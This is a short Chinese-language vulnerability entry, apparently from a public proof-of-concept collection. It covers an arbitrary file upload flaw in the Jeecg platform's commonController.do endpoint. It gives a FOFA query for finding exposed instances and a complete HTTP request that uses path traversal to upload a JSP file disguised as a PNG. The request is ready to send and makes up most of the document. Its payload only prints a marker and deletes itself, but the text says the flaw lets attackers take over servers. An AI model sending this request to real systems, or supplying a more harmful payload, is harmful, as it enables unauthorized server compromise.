## Jeecg任意文件上传漏洞

Jeecg  快速开发平台，可以应用在任何J2EE项目的开发中，尤其适合企业信息管理系统（MIS）、内部办公系统（OA）、企业资源计划系统（ERP）、客户关系管理系统（CRM）等，其半智能手工Merge的开发方式，可以显著提高开发效率70%以上，极大降低开发成本。其commonController.do接口存在任意文件上传漏洞，可悲攻击者上传恶意脚本，导致服务器被控。

## fofa
```
app="JEECG"
```

## poc
```
POST /api/../commonController.do?parserXml HTTP/1.1
Host: x.x.x.x
Accept-Encoding: gzip, deflate
Content-Length: 463
User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
Connection: close

------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; "name="name"

zW9YCa.png
------WebKitFormBoundarygcflwtei
ontent-Disposition: form-data; name="documentTitle"

blank
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="file"; filename="zW9YCa.jsp"
Content-Type: image/png

<% out.println("HelloWorld");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundarygcflwtei--
```
![a10d70f9a0848a20dd6ebc0f5f6990de](https://github.com/wy876/POC/assets/139549762/2478f8a3-cabf-46a8-abed-721fd81d9d81)

![4d05607351d88cb56932ae7a9c7bf399](https://github.com/wy876/POC/assets/139549762/de06459c-ad80-4711-8242-eaab2c6b2881)
